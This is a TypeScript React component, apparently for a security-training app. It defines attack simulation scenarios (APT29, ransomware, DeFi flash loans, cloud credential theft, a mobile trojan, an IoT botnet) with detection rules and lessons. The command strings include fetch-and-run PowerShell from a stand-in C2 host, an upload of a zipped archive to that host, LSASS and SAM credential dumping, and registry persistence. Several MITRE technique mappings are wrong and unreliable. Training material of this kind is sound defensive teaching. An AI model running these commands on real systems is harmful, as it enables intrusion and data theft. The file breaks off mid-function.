import { useEffect, useState } from "react"
import { Badge } from "@/components/ui/badge"
import { Card, CardHeader, CardTitle, CardContent } from "@/components/ui/card"
import { Button } from "@/components/ui/button"
import { Progress } from "@/components/ui/progress"
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import { ScrollArea } from "@/components/ui/scroll-area"
import { toast } from "@/hooks/use-toast"
import { 
  Play, Square, SkipForward, Target, Shield, AlertTriangle, 
  Terminal, Code, BookOpen, Trophy, Clock, Zap, Eye,
  Brain, Database, Network, Lock, FileX, Activity, Skull,
  Users, Coins, Cloud, Globe, Bug, Smartphone, Wifi
} from "lucide-react"

interface SimulationStep {
  id: string;
  name: string;
  description: string;
  mitreId: string;
  technique: string;
  commands: string[];
  expectedResults: string[];
  detectionRules: string[];
  learningPoints: string[];
  severity: 'low' | 'medium' | 'high' | 'critical';
  duration: number; // in seconds
}

interface SimulationScenario {
  id: string;
  name: string;
  description: string;
  difficulty: 'beginner' | 'intermediate' | 'advanced';
  duration: string;
  category: 'apt' | 'ransomware' | 'insider' | 'phishing' | 'blockchain' | 'defi' | 'cloud' | 'iot' | 'mobile';
  objectives: string[];
  prerequisites: string[];
  steps: SimulationStep[];
  scoreWeights: {
    stealth: number;
    speed: number;
    coverage: number;
    detection_evasion: number;
  };
  icon: any;
  tags: string[];
}

const scenarios: SimulationScenario[] = [
  {
    id: 'apt29-cozy-bear',
    name: 'APT29 Cozy Bear Campaign',
    description: 'Execute a sophisticated multi-stage APT attack simulating Russian state-sponsored tactics',
    difficulty: 'advanced',
    duration: '45 min',
    category: 'apt',
    icon: Skull,
    tags: ['State-sponsored', 'Multi-stage', 'PowerShell', 'Persistence'],
    objectives: [
      'Gain initial access via spear phishing',
      'Establish persistence mechanisms',
      'Perform credential harvesting',
      'Execute lateral movement',
      'Exfiltrate sensitive data'
    ],
    prerequisites: [
      'Understanding of MITRE ATT&CK framework',
      'Basic knowledge of PowerShell',
      'Familiarity with Windows environments'
    ],
    steps: [
      {
        id: 'initial-access',
        name: 'Spear Phishing Attack',
        description: 'Deploy targeted phishing email with malicious attachment',
        mitreId: 'T1566.001',
        technique: 'Spearphishing Attachment',
        severity: 'high',
        duration: 5,
        commands: [
          'Send-MailMessage -To "target@company.com" -Subject "Urgent: Budget Review"',
          'Invoke-WebRequest -Uri "http://c2.domain/payload.docm" -OutFile "budget.docm"',
          'Start-Process "winword.exe" -ArgumentList "budget.docm"'
        ],
        expectedResults: [
          'Email delivered to target inbox',
          'Malicious document downloaded and opened',
          'Macro execution enabled by user',
          'Initial payload executed'
        ],
        detectionRules: [
          'Monitor email attachments with suspicious extensions',
          'Detect macro execution in Office documents',
          'Track unusual outbound connections from Office processes',
          'Monitor process creation from document applications'
        ],
        learningPoints: [
          'Social engineering techniques effectiveness',
          'Importance of email security gateways',
          'User awareness training necessity',
          'Macro security policy enforcement'
        ]
      },
      {
        id: 'execution',
        name: 'PowerShell Payload Execution',
        description: 'Execute obfuscated PowerShell to download second-stage payload',
        mitreId: 'T1059.001',
        technique: 'PowerShell',
        severity: 'critical',
        duration: 8,
        commands: [
          'powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass',
          'IEX (New-Object Net.WebClient).DownloadString("http://c2.domain/stage2.ps1")',
          '$payload = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encoded))',
          'Invoke-Expression $payload'
        ],
        expectedResults: [
          'PowerShell process spawned with suspicious parameters',
          'Second-stage payload downloaded from C2 server',
          'In-memory execution initiated',
          'Persistence mechanism established'
        ],
        detectionRules: [
          'Monitor PowerShell execution with suspicious parameters',
          'Detect encoded/obfuscated PowerShell commands',
          'Track network connections from PowerShell processes',
          'Monitor Base64 encoded command execution'
        ],
        learningPoints: [
          'PowerShell abuse in attacks',
          'Importance of PowerShell logging and monitoring',
          'Application whitelisting benefits',
          'Script block logging effectiveness'
        ]
      },
      {
        id: 'persistence',
        name: 'Registry Persistence',
        description: 'Establish persistence via registry modification',
        mitreId: 'T1547.001',
        technique: 'Registry Run Keys',
        severity: 'medium',
        duration: 3,
        commands: [
          'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run',
          '/v "SecurityUpdate" /t REG_SZ /d "powershell.exe -File C:\\temp\\update.ps1"',
          'schtasks /create /tn "WindowsDefenderUpdate" /tr "C:\\temp\\update.ps1" /sc daily'
        ],
        expectedResults: [
          'Registry key created for persistence',
          'Malicious script will execute on startup',
          'Scheduled task created as backup persistence',
          'Persistence mechanism validated'
        ],
        detectionRules: [
          'Monitor registry modifications in Run keys',
          'Track creation of suspicious scheduled tasks',
          'Detect unusual PowerShell script executions',
          'Monitor file creation in system directories'
        ],
        learningPoints: [
          'Multiple persistence mechanisms',
          'Registry monitoring importance',
          'Scheduled task security',
          'Startup program analysis'
        ]
      },
      {
        id: 'credential-access',
        name: 'Credential Dumping',
        description: 'Extract credentials from memory and registry',
        mitreId: 'T1003.001',
        technique: 'LSASS Memory',
        severity: 'critical',
        duration: 6,
        commands: [
          'procdump.exe -ma lsass.exe lsass.dmp',
          'reg save HKLM\\SAM sam.hive',
          'reg save HKLM\\SYSTEM system.hive',
          'mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords"'
        ],
        expectedResults: [
          'LSASS memory dumped successfully',
          'Registry hives extracted',
          'Plaintext credentials extracted',
          'Hash values obtained for lateral movement'
        ],
        detectionRules: [
          'Monitor LSASS process access',
          'Detect registry hive exports',
          'Track credential dumping tool usage',
          'Monitor suspicious process interactions'
        ],
        learningPoints: [
          'Credential protection mechanisms',
          'LSASS hardening techniques',
          'Privileged account management',
          'Memory protection importance'
        ]
      },
      {
        id: 'lateral-movement',
        name: 'SMB Lateral Movement',
        description: 'Move laterally through the network using stolen credentials',
        mitreId: 'T1021.002',
        technique: 'SMB/Windows Admin Shares',
        severity: 'high',
        duration: 7,
        commands: [
          'net use \\\\server-01\\c$ /user:domain\\admin password123',
          'copy payload.exe \\\\server-01\\c$\\temp\\',
          'wmic /node:server-01 process call create "c:\\temp\\payload.exe"',
          'psexec \\\\server-01 -u domain\\admin -p password123 cmd'
        ],
        expectedResults: [
          'SMB connection established to target server',
          'Payload copied to remote system',
          'Remote code execution achieved',
          'Administrative access gained on target'
        ],
        detectionRules: [
          'Monitor SMB traffic and connections',
          'Track administrative share access',
          'Detect lateral movement tools',
          'Monitor process creation on remote systems'
        ],
        learningPoints: [
          'Network segmentation importance',
          'SMB security hardening',
          'Lateral movement detection',
          'Administrative share risks'
        ]
      },
      {
        id: 'data-exfiltration',
        name: 'Data Exfiltration',
        description: 'Exfiltrate sensitive data through encrypted channels',
        mitreId: 'T1041',
        technique: 'Exfiltration Over C2 Channel',
        severity: 'critical',
        duration: 4,
        commands: [
          'Get-ChildItem -Path "C:\\Users\\*\\Documents\\*.pdf" -Recurse',
          'Compress-Archive -Path $files -DestinationPath "data.zip"',
          'Invoke-WebRequest -Uri "https://c2.domain/upload" -Method POST -InFile "data.zip"',
          'Remove-Item "data.zip" -Force'
        ],
        expectedResults: [
          'Sensitive files identified and collected',
          'Data compressed for exfiltration',
          'Files uploaded to C2 server',
          'Evidence cleaned up'
        ],
        detectionRules: [
          'Monitor large file transfers',
          'Track HTTPS uploads to unknown domains',
          'Detect file compression activities',
          'Monitor access to sensitive directories'
        ],
        learningPoints: [
          'Data loss prevention importance',
          'Network monitoring for exfiltration',
          'File access auditing',
          'Encryption vs obfuscation detection'
        ]
      }
    ],
    scoreWeights: {
      stealth: 0.3,
      speed: 0.2,
      coverage: 0.3,
      detection_evasion: 0.2
    }
  },
  {
    id: 'defi-flash-loan-attack',
    name: 'DeFi Flash Loan Attack',
    description: 'Simulate a sophisticated flash loan attack on decentralized finance protocols',
    difficulty: 'advanced',
    duration: '35 min',
    category: 'defi',
    icon: Coins,
    tags: ['DeFi', 'Flash Loan', 'Smart Contract', 'Arbitrage'],
    objectives: [
      'Identify vulnerable DeFi protocol',
      'Execute flash loan borrowing',
      'Manipulate price oracles',
      'Perform arbitrage attack',
      'Repay loan with profit'
    ],
    prerequisites: [
      'Understanding of DeFi protocols',
      'Knowledge of smart contracts',
      'Familiarity with Ethereum ecosystem'
    ],
    steps: [
      {
        id: 'protocol-analysis',
        name: 'Protocol Vulnerability Analysis',
        description: 'Analyze DeFi protocol for flash loan opportunities',
        mitreId: 'T1190',
        technique: 'Exploit Public-Facing Application',
        severity: 'medium',
        duration: 8,
        commands: [
          'web3.eth.getCode("0x...protocol_address")',
          'analyze_smart_contract("protocol.sol")',
          'check_oracle_dependencies()',
          'identify_flash_loan_providers()'
        ],
        expectedResults: [
          'Protocol smart contract analyzed',
          'Price oracle dependencies identified',
          'Flash loan providers enumerated',
          'Vulnerable functions discovered'
        ],
        detectionRules: [
          'Monitor smart contract interactions',
          'Track unusual transaction patterns',
          'Detect automated contract analysis',
          'Monitor oracle price feeds'
        ],
        learningPoints: [
          'DeFi protocol security analysis',
          'Smart contract vulnerability assessment',
          'Oracle manipulation risks',
          'Flash loan attack vectors'
        ]
      },
      {
        id: 'flash-loan-execution',
        name: 'Flash Loan Execution',
        description: 'Execute flash loan to borrow large amounts without collateral',
        mitreId: 'T1486',
        technique: 'Data Encrypted for Impact',
        severity: 'high',
        duration: 5,
        commands: [
          'flashLoan(token_address, amount, calldata)',
          'borrow_from_aave(1000000 * 10**18, "USDC")',
          'execute_callback(borrowed_amount)',
          'initiate_attack_sequence()'
        ],
        expectedResults: [
          'Flash loan successfully initiated',
          'Large amount borrowed without collateral',
          'Attack callback function triggered',
          'Temporary liquidity obtained'
        ],
        detectionRules: [
          'Monitor large flash loan transactions',
          'Track unusually large borrows',
          'Detect rapid loan-repay cycles',
          'Monitor MEV bot activities'
        ],
        learningPoints: [
          'Flash loan mechanics',
          'DeFi liquidity risks',
          'Atomic transaction requirements',
          'MEV extraction techniques'
        ]
      },
      {
        id: 'oracle-manipulation',
        name: 'Price Oracle Manipulation',
        description: 'Manipulate price oracles to create arbitrage opportunities',
        mitreId: 'T1565.001',
        technique: 'Stored Data Manipulation',
        severity: 'critical',
        duration: 7,
        commands: [
          'manipulate_pool_price(target_pool, new_price)',
          'execute_large_swap(token_a, token_b, amount)',
          'trigger_oracle_update()',
          'monitor_price_deviation()'
        ],
        expectedResults: [
          'Pool price successfully manipulated',
          'Oracle price feed affected',
          'Price deviation created',
          'Arbitrage opportunity established'
        ],
        detectionRules: [
          'Monitor extreme price movements',
          'Track large single transactions',
          'Detect oracle price deviations',
          'Monitor MEV sandwich attacks'
        ],
        learningPoints: [
          'Oracle manipulation techniques',
          'Price feed security',
          'MEV protection strategies',
          'Slippage protection importance'
        ]
      },
      {
        id: 'arbitrage-execution',
        name: 'Arbitrage Execution',
        description: 'Execute arbitrage trades across multiple protocols',
        mitreId: 'T1020',
        technique: 'Automated Exfiltration',
        severity: 'high',
        duration: 6,
        commands: [
          'execute_arbitrage_trade(protocol_a, protocol_b)',
          'swap_tokens(manipulated_price)',
          'extract_profit()',
          'calculate_gas_optimization()'
        ],
        expectedResults: [
          'Arbitrage trades executed successfully',
          'Profit extracted from price difference',
          'Gas costs optimized',
          'Maximum value extracted'
        ],
        detectionRules: [
          'Monitor cross-protocol arbitrage',
          'Track profit extraction patterns',
          'Detect automated trading bots',
          'Monitor flash loan profitability'
        ],
        learningPoints: [
          'Arbitrage trading mechanics',
          'Cross-protocol interactions',
          'Gas optimization strategies',
          'MEV extraction ethics'
        ]
      },
      {
        id: 'loan-repayment',
        name: 'Flash Loan Repayment',
        description: 'Repay flash loan with interest and retain profit',
        mitreId: 'T1070.004',
        technique: 'File Deletion',
        severity: 'medium',
        duration: 4,
        commands: [
          'calculate_repayment_amount()',
          'repay_flash_loan(principal + interest)',
          'transfer_profit_to_wallet()',
          'clean_up_transactions()'
        ],
        expectedResults: [
          'Flash loan repaid successfully',
          'Interest payment completed',
          'Profit transferred to attacker wallet',
          'Transaction traces minimized'
        ],
        detectionRules: [
          'Monitor flash loan repayments',
          'Track profit extraction transactions',
          'Detect wallet funding patterns',
          'Monitor post-attack behaviors'
        ],
        learningPoints: [
          'Flash loan repayment mechanics',
          'Profit calculation methods',
          'Transaction privacy techniques',
          'Attack profitability analysis'
        ]
      }
    ],
    scoreWeights: {
      stealth: 0.4,
      speed: 0.3,
      coverage: 0.2,
      detection_evasion: 0.1
    }
  },
  {
    id: 'ransomware-locky',
    name: 'Locky Ransomware Campaign',
    description: 'Simulate a ransomware attack with encryption and payment demands',
    difficulty: 'intermediate',
    duration: '30 min',
    category: 'ransomware',
    icon: Lock,
    tags: ['Ransomware', 'Encryption', 'Email', 'Bitcoin'],
    objectives: [
      'Deliver ransomware via email',
      'Execute payload on target system',
      'Encrypt user files',
      'Display ransom note',
      'Establish payment channel'
    ],
    prerequisites: [
      'Understanding of ransomware mechanics',
      'Knowledge of file encryption',
      'Familiarity with cryptocurrency'
    ],
    steps: [
      {
        id: 'email-delivery',
        name: 'Malicious Email Delivery',
        description: 'Deliver ransomware via phishing email campaign',
        mitreId: 'T1566.001',
        technique: 'Spearphishing Attachment',
        severity: 'high',
        duration: 4,
        commands: [
          'send_phishing_email("invoice.zip", target_list)',
          'track_email_delivery()',
          'monitor_click_rates()',
          'trigger_payload_download()'
        ],
        expectedResults: [
          'Phishing emails delivered successfully',
          'Recipients opened malicious attachments',
          'Payload downloaded and executed',
          'Initial foothold established'
        ],
        detectionRules: [
          'Monitor email attachments with suspicious names',
          'Track ZIP file downloads',
          'Detect mass email campaigns',
          'Monitor attachment execution'
        ],
        learningPoints: [
          'Email security importance',
          'Attachment scanning effectiveness',
          'User training impact',
          'Phishing detection techniques'
        ]
      },
      {
        id: 'file-encryption',
        name: 'File Encryption Process',
        description: 'Encrypt user files with strong encryption algorithm',
        mitreId: 'T1486',
        technique: 'Data Encrypted for Impact',
        severity: 'critical',
        duration: 12,
        commands: [
          'enumerate_target_files()',
          'generate_encryption_key()',
          'encrypt_files_with_aes256()',
          'delete_original_files()'
        ],
        expectedResults: [
          'User files identified and catalogued',
          'Strong encryption key generated',
          'Files encrypted with AES-256',
          'Original files securely deleted'
        ],
        detectionRules: [
          'Monitor mass file modifications',
          'Detect file extension changes',
          'Track encryption process behaviors',
          'Monitor file deletion patterns'
        ],
        learningPoints: [
          'File encryption techniques',
          'Backup importance',
          'Behavioral detection methods',
          'Encryption key management'
        ]
      },
      {
        id: 'ransom-note',
        name: 'Ransom Note Display',
        description: 'Display ransom note with payment instructions',
        mitreId: 'T1491.001',
        technique: 'Internal Defacement',
        severity: 'medium',
        duration: 2,
        commands: [
          'create_ransom_note("YOUR_FILES_ENCRYPTED.txt")',
          'set_desktop_wallpaper("ransom_image.jpg")',
          'display_popup_window()',
          'start_countdown_timer()'
        ],
        expectedResults: [
          'Ransom note displayed prominently',
          'Desktop wallpaper changed',
          'Popup window with instructions',
          'Payment countdown initiated'
        ],
        detectionRules: [
          'Monitor desktop wallpaper changes',
          'Detect ransom note file creation',
          'Track unusual popup activities',
          'Monitor system message displays'
        ],
        learningPoints: [
          'Psychological impact techniques',
          'Ransom note design principles',
          'User intimidation tactics',
          'Payment pressure methods'
        ]
      },
      {
        id: 'payment-channel',
        name: 'Payment Channel Setup',
        description: 'Establish cryptocurrency payment channel',
        mitreId: 'T1573.002',
        technique: 'Asymmetric Cryptography',
        severity: 'medium',
        duration: 3,
        commands: [
          'generate_bitcoin_address()',
          'setup_tor_communication()',
          'create_payment_portal()',
          'monitor_blockchain_transactions()'
        ],
        expectedResults: [
          'Unique Bitcoin address generated',
          'Tor network communication established',
          'Payment portal accessible',
          'Blockchain monitoring active'
        ],
        detectionRules: [
          'Monitor Tor network connections',
          'Track cryptocurrency transactions',
          'Detect payment portal access',
          'Monitor blockchain addresses'
        ],
        learningPoints: [
          'Cryptocurrency payment systems',
          'Tor network usage',
          'Payment verification methods',
          'Blockchain analysis techniques'
        ]
      }
    ],
    scoreWeights: {
      stealth: 0.2,
      speed: 0.3,
      coverage: 0.3,
      detection_evasion: 0.2
    }
  },
  {
    id: 'cloud-credential-theft',
    name: 'Cloud Credential Theft',
    description: 'Simulate cloud environment credential theft and privilege escalation',
    difficulty: 'intermediate',
    duration: '25 min',
    category: 'cloud',
    icon: Cloud,
    tags: ['Cloud', 'AWS', 'Credentials', 'Privilege Escalation'],
    objectives: [
      'Discover cloud metadata service',
      'Extract temporary credentials',
      'Escalate privileges',
      'Access sensitive resources',
      'Maintain persistence'
    ],
    prerequisites: [
      'Understanding of cloud security',
      'Knowledge of AWS/Azure services',
      'Familiarity with IAM roles'
    ],
    steps: [
      {
        id: 'metadata-discovery',
        name: 'Cloud Metadata Discovery',
        description: 'Discover and access cloud metadata service',
        mitreId: 'T1552.005',
        technique: 'Cloud Instance Metadata API',
        severity: 'high',
        duration: 5,
        commands: [
          'curl http://169.254.169.254/latest/meta-data/',
          'curl http://169.254.169.254/latest/meta-data/iam/security-credentials/',
          'enumerate_instance_metadata()',
          'extract_role_credentials()'
        ],
        expectedResults: [
          'Metadata service accessible',
          'IAM role credentials discovered',
          'Temporary tokens extracted',
          'Instance identity confirmed'
        ],
        detectionRules: [
          'Monitor metadata service access',
          'Track unusual API calls',
          'Detect credential extraction',
          'Monitor instance role usage'
        ],
        learningPoints: [
          'Cloud metadata security',
          'IAM role configuration',
          'Instance security hardening',
          'Credential rotation importance'
        ]
      },
      {
        id: 'privilege-escalation',
        name: 'Cloud Privilege Escalation',
        description: 'Escalate privileges using stolen credentials',
        mitreId: 'T1078.004',
        technique: 'Cloud Accounts',
        severity: 'critical',
        duration: 8,
        commands: [
          'aws sts get-caller-identity',
          'aws iam list-attached-role-policies',
          'aws iam create-role --role-name EscalatedRole',
          'aws iam attach-role-policy --role-name EscalatedRole'
        ],
        expectedResults: [
          'Current identity confirmed',
          'Existing permissions enumerated',
          'New privileged role created',
          'Additional permissions attached'
        ],
        detectionRules: [
          'Monitor IAM role creation',
          'Track policy attachments',
          'Detect privilege escalation',
          'Monitor unusual API patterns'
        ],
        learningPoints: [
          'IAM privilege escalation',
          'Role-based access control',
          'Least privilege principle',
          'Cloud security monitoring'
        ]
      },
      {
        id: 'resource-access',
        name: 'Sensitive Resource Access',
        description: 'Access sensitive cloud resources with escalated privileges',
        mitreId: 'T1530',
        technique: 'Data from Cloud Storage Object',
        severity: 'high',
        duration: 6,
        commands: [
          'aws s3 ls --recursive',
          'aws s3 cp s3://sensitive-bucket/ ./data/ --recursive',
          'aws rds describe-db-instances',
          'aws secretsmanager get-secret-value'
        ],
        expectedResults: [
          'S3 buckets enumerated',
          'Sensitive files downloaded',
          'Database instances discovered',
          'Secrets manager accessed'
        ],
        detectionRules: [
          'Monitor S3 bucket access',
          'Track large data downloads',
          'Detect secrets access',
          'Monitor database connections'
        ],
        learningPoints: [
          'Cloud data protection',
          'S3 bucket security',
          'Database access controls',
          'Secrets management best practices'
        ]
      }
    ],
    scoreWeights: {
      stealth: 0.3,
      speed: 0.2,
      coverage: 0.4,
      detection_evasion: 0.1
    }
  },
  {
    id: 'mobile-banking-trojan',
    name: 'Mobile Banking Trojan',
    description: 'Simulate mobile banking trojan attack with SMS interception',
    difficulty: 'intermediate',
    duration: '20 min',
    category: 'mobile',
    icon: Smartphone,
    tags: ['Mobile', 'Android', 'Banking', 'SMS', 'Overlay'],
    objectives: [
      'Deploy mobile trojan',
      'Intercept SMS messages',
      'Capture banking credentials',
      'Perform fraudulent transactions',
      'Evade detection'
    ],
    prerequisites: [
      'Understanding of mobile security',
      'Knowledge of Android platform',
      'Familiarity with banking apps'
    ],
    steps: [
      {
        id: 'trojan-deployment',
        name: 'Mobile Trojan Deployment',
        description: 'Deploy banking trojan through fake app installation',
        mitreId: 'T1475',
        technique: 'Deliver Malicious App via Authorized App Store',
        severity: 'high',
        duration: 6,
        commands: [
          'create_fake_banking_app()',
          'submit_to_app_store()',
          'social_engineering_campaign()',
          'monitor_installation_rates()'
        ],
        expectedResults: [
          'Fake banking app created',
          'App store approval obtained',
          'Users tricked into installation',
          'Trojan successfully deployed'
        ],
        detectionRules: [
          'Monitor app store submissions',
          'Detect fake app signatures',
          'Track unusual app behaviors',
          'Monitor permission requests'
        ],
        learningPoints: [
          'Mobile app security',
          'App store security measures',
          'Social engineering tactics',
          'Permission model importance'
        ]
      },
      {
        id: 'sms-interception',
        name: 'SMS Interception',
        description: 'Intercept SMS messages for 2FA bypass',
        mitreId: 'T1430',
        technique: 'Location Tracking',
        severity: 'critical',
        duration: 4,
        commands: [
          'request_sms_permissions()',
          'register_sms_receiver()',
          'intercept_2fa_codes()',
          'forward_sms_to_c2()'
        ],
        expectedResults: [
          'SMS permissions granted',
          'SMS receiver registered',
          '2FA codes intercepted',
          'Messages forwarded to attacker'
        ],
        detectionRules: [
          'Monitor SMS permission usage',
          'Detect SMS interception',
          'Track unusual SMS patterns',
          'Monitor 2FA bypass attempts'
        ],
        learningPoints: [
          'SMS security weaknesses',
          '2FA bypass techniques',
          'Mobile permission security',
          'Alternative authentication methods'
        ]
      },
      {
        id: 'credential-capture',
        name: 'Banking Credential Capture',
        description: 'Capture banking credentials using overlay attacks',
        mitreId: 'T1417',
        technique: 'Input Capture',
        severity: 'critical',
        duration: 5,
        commands: [
          'detect_banking_app_launch()',
          'display_overlay_screen()',
          'capture_login_credentials()',
          'store_encrypted_credentials()'
        ],
        expectedResults: [
          'Banking app launch detected',
          'Fake overlay displayed',
          'User credentials captured',
          'Credentials stored securely'
        ],
        detectionRules: [
          'Monitor overlay attacks',
          'Detect screen recording',
          'Track credential capture',
          'Monitor app overlay permissions'
        ],
        learningPoints: [
          'Overlay attack techniques',
          'Mobile app security',
          'Screen protection methods',
          'Behavioral detection'
        ]
      },
      {
        id: 'fraudulent-transaction',
        name: 'Fraudulent Transaction',
        description: 'Execute fraudulent banking transactions',
        mitreId: 'T1566.002',
        technique: 'Spearphishing Link',
        severity: 'critical',
        duration: 3,
        commands: [
          'authenticate_with_stolen_creds()',
          'initiate_money_transfer()',
          'bypass_transaction_limits()',
          'confirm_with_intercepted_sms()'
        ],
        expectedResults: [
          'Authentication successful',
          'Money transfer initiated',
          'Transaction limits bypassed',
          'SMS confirmation intercepted'
        ],
        detectionRules: [
          'Monitor unusual transaction patterns',
          'Detect device fingerprint changes',
          'Track rapid authentication events',
          'Monitor transaction velocity'
        ],
        learningPoints: [
          'Transaction monitoring',
          'Device fingerprinting',
          'Fraud detection systems',
          'Risk-based authentication'
        ]
      }
    ],
    scoreWeights: {
      stealth: 0.4,
      speed: 0.3,
      coverage: 0.2,
      detection_evasion: 0.1
    }
  },
  {
    id: 'iot-botnet-attack',
    name: 'IoT Botnet Attack',
    description: 'Simulate IoT device compromise and botnet formation',
    difficulty: 'beginner',
    duration: '15 min',
    category: 'iot',
    icon: Wifi,
    tags: ['IoT', 'Botnet', 'Mirai', 'DDoS'],
    objectives: [
      'Scan for vulnerable IoT devices',
      'Exploit default credentials',
      'Install botnet malware',
      'Form botnet network',
      'Launch DDoS attack'
    ],
    prerequisites: [
      'Understanding of IoT security',
      'Knowledge of network scanning',
      'Familiarity with botnet operations'
    ],
    steps: [
      {
        id: 'iot-scanning',
        name: 'IoT Device Scanning',
        description: 'Scan network for vulnerable IoT devices',
        mitreId: 'T1046',
        technique: 'Network Service Scanning',
        severity: 'medium',
        duration: 4,
        commands: [
          'nmap -sS -O 192.168.1.0/24',
          'masscan -p80,8080,23,22 192.168.1.0/24',
          'identify_iot_devices()',
          'enumerate_services()'
        ],
        expectedResults: [
          'Network devices discovered',
          'IoT devices identified',
          'Open ports enumerated',
          'Services fingerprinted'
        ],
        detectionRules: [
          'Monitor network scanning activities',
          'Detect port scanning attempts',
          'Track unusual network traffic',
          'Monitor IoT device communications'
        ],
        learningPoints: [
          'Network scanning techniques',
          'IoT device identification',
          'Network segmentation importance',
          'IoT security monitoring'
        ]
      },
      {
        id: 'credential-attack',
        name: 'Default Credential Attack',
        description: 'Attack IoT devices using default credentials',
        mitreId: 'T1110.001',
        technique: 'Password Guessing',
        severity: 'high',
        duration: 3,
        commands: [
          'try_default_credentials(target_devices)',
          'brute_force_common_passwords()',
          'test_credential_combinations()',
          'log_successful_logins()'
        ],
        expectedResults: [
          'Default credentials identified',
          'Successful logins achieved',
          'Device access obtained',
          'Credential database updated'
        ],
        detectionRules: [
          'Monitor failed login attempts',
          'Detect brute force attacks',
          'Track credential stuffing',
          'Monitor IoT authentication'
        ],
        learningPoints: [
          'Default credential risks',
          'Password policy importance',
          'IoT authentication security',
          'Credential management'
        ]
      },
      {
        id: 'malware-installation',
        name: 'Botnet Malware Installation',
        description: 'Install botnet malware on compromised devices',
        mitreId: 'T1105',
        technique: 'Ingress Tool Transfer',
        severity: 'high',
        duration: 5,
        commands: [
          'download_botnet_payload()',
          'install_persistent_malware()',
          'establish_c2_connection()',
          'register_with_botnet()'
        ],
        expectedResults: [
          'Malware payload downloaded',
          'Persistent installation achieved',
          'C2 communication established',
          'Device registered in botnet'
        ],
        detectionRules: [
          'Monitor file downloads',
          'Detect malware installation',
          'Track C2 communications',
          'Monitor botnet traffic'
        ],
        learningPoints: [
          'Malware persistence techniques',
          'C2 communication methods',
          'Botnet architecture',
          'IoT malware analysis'
        ]
      },
      {
        id: 'ddos-attack',
        name: 'DDoS Attack Launch',
        description: 'Launch coordinated DDoS attack using botnet',
        mitreId: 'T1498.001',
        technique: 'Direct Network Flood',
        severity: 'critical',
        duration: 3,
        commands: [
          'receive_attack_command()',
          'coordinate_botnet_nodes()',
          'launch_ddos_flood(target_ip)',
          'monitor_attack_effectiveness()'
        ],
        expectedResults: [
          'Attack commands received',
          'Botnet nodes coordinated',
          'DDoS attack launched',
          'Target overwhelmed'
        ],
        detectionRules: [
          'Monitor unusual traffic patterns',
          'Detect DDoS attack signatures',
          'Track botnet command patterns',
          'Monitor network anomalies'
        ],
        learningPoints: [
          'DDoS attack techniques',
          'Botnet coordination',
          'Network traffic analysis',
          'DDoS mitigation strategies'
        ]
      }
    ],
    scoreWeights: {
      stealth: 0.1,
      speed: 0.4,
      coverage: 0.3,
      detection_evasion: 0.2
    }
  }
];

export function SimulatedAPTChain() {
  const [selectedScenario, setSelectedScenario] = useState<SimulationScenario>(scenarios[0]);
  const [currentStep, setCurrentStep] = useState<number>(0);
  const [logs, setLogs] = useState<string[]>([]);
  const [isRunning, setIsRunning] = useState<boolean>(false);
  const [isPaused, setIsPaused] = useState<boolean>(false);
  const [progress, setProgress] = useState<number>(0);
  const [score, setScore] = useState<number>(0);
  const [simulationMode, setSimulationMode] = useState<'automatic' | 'manual'>('automatic');
  const [activeTab, setActiveTab] = useState<string>('scenarios');

  useEffect(() => {
    let interval: NodeJS.Timeout;

    if (isRunning && !isPaused && currentStep < selectedScenario.steps.length && simulationMode === 'automatic') {
      const step = selectedScenario.steps[currentStep];
      interval = setInterval(() => {
        executeStep(step);
      }, step.duration * 1000);
    }

    return () => clearInterval(interval);
  }, [isRunning, isPaused, currentStep, selectedScenario, simulationMode]);

  const executeStep = (step: SimulationStep) => {
    const timestamp = new Date().toLocaleTimeString();
    const severityColor = {
      low: 'text-green-400',
      medium: 'text-yellow-400',
      high: 'text-orange-400',
      critical: 'text-red-400'
    }[step.severity];

    // Get detailed explanations based on scenario category
    const getDetailedExplanation = (step: SimulationStep) => {
      const category = selectedScenario.category;
      const stepId = step.id;
      
      if (category === 'defi' && stepId === 'protocol-analysis') {
        return [
          `[${timestamp}] 📖 DETAILED EXPLANATION: DeFi Protocol Analysis`,
          `[${timestamp}] What is happening: We're analyzing a DeFi protocol to find vulnerabilities`,
          `[${timestamp}] Why it's dangerous: DeFi protocols handle millions in cryptocurrency`,
          `[${timestamp}] 🔍 Step 1: Examining smart contract code for vulnerabilities`,
          `[${timestamp}] 🔍 Step 2: Identifying price oracle dependencies (critical weakness)`,
          `[${timestamp}] 🔍 Step 3: Finding flash loan providers (our attack vector)`,
          `[${timestamp}] 🔍 Step 4: Mapping protocol interactions and dependencies`,
          `[${timestamp}] 💡 Key Insight: Price oracles are often the weakest link in DeFi`,
          `[${timestamp}] 💡 Attack Vector: Flash loans allow borrowing without collateral`,
          `[${timestamp}] 💡 Target: Protocols with single price oracle dependency`,
          `[${timestamp}] 🛡️ Defense: Use multiple price oracles (Chainlink, Band Protocol)`,
          `[${timestamp}] 🛡️ Defense: Implement time-weighted average pricing (TWAP)`,
          `[${timestamp}] 🛡️ Defense: Add circuit breakers for extreme price movements`,
          ''
        ];
      } else if (category === 'defi' && stepId === 'flash-loan-execution') {
        return [
          `[${timestamp}] 📖 DETAILED EXPLANATION: Flash Loan Attack Execution`,
          `[${timestamp}] What is happening: Borrowing massive amounts without collateral`,
          `[${timestamp}] Why it works: All operations happen in single transaction`,
          `[${timestamp}] 🔍 Step 1: Identify flash loan providers (Aave, dYdX, Uniswap)`,
          `[${timestamp}] 🔍 Step 2: Calculate maximum borrowable amount`,
          `[${timestamp}] 🔍 Step 3: Execute flash loan callback function`,
          `[${timestamp}] 🔍 Step 4: Perform price manipulation within same transaction`,
          `[${timestamp}] 💡 Key Insight: Flash loans must be repaid in same transaction`,
          `[${timestamp}] 💡 Attack Vector: Manipulate price, arbitrage, repay loan + fee`,
          `[${timestamp}] 💡 Profit: Keep difference between manipulated prices`,
          `[${timestamp}] 🛡️ Defense: Monitor large flash loan transactions`,
          `[${timestamp}] 🛡️ Defense: Implement MEV protection mechanisms`,
          `[${timestamp}] 🛡️ Defense: Use decentralized price feeds`,
          ''
        ];
      } else if (category === 'defi' && stepId === 'oracle-manipulation') {
        return [
          `[${timestamp}] 📖 DETAILED EXPLANATION: Price Oracle Manipulation`,
